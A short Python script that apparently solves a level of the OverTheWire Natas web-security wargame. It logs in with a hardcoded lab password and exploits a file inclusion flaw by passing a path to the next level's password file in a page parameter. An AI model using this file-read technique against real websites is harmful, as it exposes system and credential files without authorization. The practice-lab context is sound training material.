import requests
url="http://natas7.natas.labs.overthewire.org"
auth_name = 'natas7'
auth_pass = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

p=dict(page="/etc/natas_webpass/natas8")
r=requests.get(url,auth=(auth_name,auth_pass),params=p)
print(r.text)
